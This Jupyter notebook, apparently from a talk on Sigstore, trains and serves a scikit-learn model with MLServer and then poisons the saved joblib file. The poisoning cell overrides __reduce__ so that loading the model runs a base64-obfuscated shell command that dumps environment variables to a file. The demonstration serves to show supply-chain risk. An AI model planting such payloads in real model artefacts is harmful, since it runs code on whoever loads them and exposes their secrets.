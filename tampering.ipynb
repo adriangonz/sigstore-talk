{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "e78a7864-9728-410a-9827-a4e5a3372d8e",
   "metadata": {},
   "source": [
    "# Poisoning Example\n",
    "\n",
    "This notebook demonstrates a simple poisoning attach to generate a malicious artefact that dumps all the environment variables."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f0e8f5d8-6032-4e27-bc8d-0cf49b8b34cc",
   "metadata": {},
   "source": [
    "## Training"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4b0aed87-72b4-4d5e-97d7-b534d54ce57f",
   "metadata": {},
   "source": [
    "The first step will be to train a simple `scikit-learn` model.\n",
    "For that, we will use the [MNIST example from the `scikit-learn` documentation](https://scikit-learn.org/stable/auto_examples/classification/plot_digits_classification.html) which trains an SVM model."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "74c603c4-cb8a-4c7a-9718-164cccb29069",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Original source code and more details can be found in:\n",
    "# https://scikit-learn.org/stable/auto_examples/classification/plot_digits_classification.html\n",
    "\n",
    "# Import datasets, classifiers and performance metrics\n",
    "from sklearn import datasets, svm, metrics\n",
    "from sklearn.model_selection import train_test_split\n",
    "\n",
    "# The digits dataset\n",
    "digits = datasets.load_digits()\n",
    "\n",
    "# To apply a classifier on this data, we need to flatten the image, to\n",
    "# turn the data in a (samples, feature) matrix:\n",
    "n_samples = len(digits.images)\n",
    "data = digits.images.reshape((n_samples, -1))\n",
    "\n",
    "# Create a classifier: a support vector classifier\n",
    "classifier = svm.SVC(gamma=0.001)\n",
    "\n",
    "# Split data into train and test subsets\n",
    "X_train, X_test, y_train, y_test = train_test_split(\n",
    "    data, digits.target, test_size=0.5, shuffle=False)\n",
    "\n",
    "# We learn the digits on the first half of the digits\n",
    "classifier.fit(X_train, y_train)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "95d40eb2-af0d-4daf-83ac-e2263673c938",
   "metadata": {},
   "source": [
    "### Saving our Trained Model"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2df5ca8d-9517-4226-8c5a-1ec443b08367",
   "metadata": {},
   "source": [
    "To save our trained model, we will serialise it using `joblib`.\n",
    "While this is not a perfect approach, it's currently the recommended method to persist models to disk in the [`scikit-learn` documentation](https://scikit-learn.org/stable/modules/model_persistence.html).\n",
    "\n",
    "Our model will be persisted as a file named `mnist-svm.joblib`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ca1d668c-87bb-4391-83a2-fd58ed1d556a",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import joblib\n",
    "\n",
    "model_file_name = \"./models/naive-model/model.joblib\"\n",
    "joblib.dump(classifier, model_file_name)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8a3e68d8-d883-4609-a055-a77f446f1094",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "open(model_file_name, 'rb').read()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cc231b0b-06b3-4a39-8bfd-e497e9f0df9e",
   "metadata": {},
   "source": [
    "## Serving\n",
    "\n",
    "Next step will be to serve our un-tampered model to show it's working as expected.\n",
    "\n",
    "For this, we will leverage [MLServer](mlserver.readthedocs.io/) - a simple inference server that ships a Scikit-Learn inference runtime out-of-the-box.\n",
    "The only requirement will be to create a `model-settings.json` file that instructs MLServer to use the SKLearn runtime to serve this model."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e68f87f4-9784-4e56-bf3a-f08c455d98ca",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "%%writefile models/naive-model/model-settings.json\n",
    "{\n",
    "    \"name\": \"naive-model\",\n",
    "    \"implementation\": \"mlserver_sklearn.SKLearnModel\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ad5921e3-265a-4dbd-a2f4-beab358f7c57",
   "metadata": {},
   "source": [
    "With our config file in place, the next step will be to start MLServer on a separate terminal with:\n",
    "\n",
    "```bash\n",
    "mlserver start ./models/naive-model\n",
    "```\n",
    "\n",
    "As we can see, the model gets loaded correctly, and can serve inference requests."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a3654fce-cc03-457e-92e5-d24b504ed5ba",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "from mlserver.types import InferenceResponse\n",
    "from mlserver.codecs import NumpyRequestCodec\n",
    "\n",
    "endpoint = \"http://localhost:8080/v2/models/naive-model/infer\"\n",
    "req = NumpyRequestCodec.encode_request(X_test[0:1])\n",
    "res = requests.post(endpoint, json=req.dict())\n",
    "\n",
    "res.json()\n",
    "inf_res = InferenceResponse(**res.json())\n",
    "NumpyRequestCodec.decode_response(inf_res)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "409c5eb2-fcc6-4afa-8429-552fdf3a1896",
   "metadata": {},
   "source": [
    "## Poisoning"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b74be397-94a3-4edd-949c-3c62f7363153",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import types, os, base64\n",
    "\n",
    "def __reduce__(self):\n",
    "    # This is basically base64 for cmd = \"env > pwnd.txt\"\n",
    "    cmd = base64.b64decode(\"ZW52ID4gcHduZC50eHQ=\").decode() \n",
    "    return os.system, (cmd,)\n",
    "\n",
    "classifier.__class__.__reduce__ = types.MethodType(__reduce__, classifier.__class__)\n",
    "joblib.dump(classifier, model_file_name)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "587fa4aa-9e67-4e5c-b9a3-626bbf4a9c61",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "with open(model_file_name, \"rb\") as f: print(f.readlines())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "260f1ac9-ffbe-4057-bacf-45b1a373bd3c",
   "metadata": {},
   "source": [
    "If we now try to reload our model, MLServer will (unknowingly) load the poisoned model which will - in turn - dump our entire environment (which could include passwords, etc.)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1bf8a4ea-9c9b-46fb-9f2b-f9195be8b619",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import requests\n",
    "\n",
    "endpoint = \"http://localhost:8080/v2/repository/models/naive-model/load\"\n",
    "requests.post(endpoint)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0dd47dcb-8554-459b-a578-8065d84e8c16",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "!head ./models/naive-model/pwnd.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2725cdd0-cc23-410d-97f9-220c00af9a98",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
